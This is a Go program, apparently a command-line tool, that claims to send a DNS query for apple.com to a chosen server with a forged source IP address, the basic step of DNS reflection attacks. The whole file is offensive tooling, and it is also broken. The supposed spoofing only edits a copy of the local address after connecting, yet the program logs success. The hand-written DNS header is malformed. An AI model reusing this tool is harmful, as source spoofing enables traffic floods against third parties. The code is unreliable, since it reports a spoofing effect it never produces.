package main

import (
	"flag"
	"log"
	"net"
)

func main() {
	// Command-line flags
	dnsServerPtr := flag.String("dns-server", "", "DNS Server IP address")
	spoofedIPPtr := flag.String("spoofed-ip", "", "Spoofed IP address")
	flag.Parse()

	if *dnsServerPtr == "" || *spoofedIPPtr == "" {
		log.Fatal("DNS server IP and spoofed IP must be provided")
	}

	// Resolve DNS server address
	dnsAddr, err := net.ResolveUDPAddr("udp", *dnsServerPtr+":53")
	if err != nil {
		log.Fatal("Failed to resolve DNS server address:", err)
	}

	// Formulate DNS request
	dnsRequest := []byte{
		0x00, 0x00, // Transaction ID
		0x01, 0x00, // Standard query
		0x00, 0x01, // Number of questions
		0x00, 0x00, // Number of answers, authority, and additional sections
		0x05, 0x61, 0x70, 0x70, 0x6c, 0x65, // "apple"
		0x03, 0x63, 0x6f, 0x6d, // "com"
		0x00, // Null byte
		0x00, 0x01, // Query type A
		0x00, 0x01, // Query class IN
	}

	// Create UDP socket
	conn, err := net.DialUDP("udp", nil, dnsAddr)
	if err != nil {
		log.Fatal("Failed to create UDP socket:", err)
	}
	defer conn.Close()

	// Spoof source IP address
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	localAddr.IP = net.ParseIP(*spoofedIPPtr)

	// Send spoofed DNS request
	_, err = conn.Write(dnsRequest)
	if err != nil {
		log.Fatal("Failed to send DNS request:", err)
	}

	log.Println("Spoofed DNS request sent to", dnsAddr.IP)
}
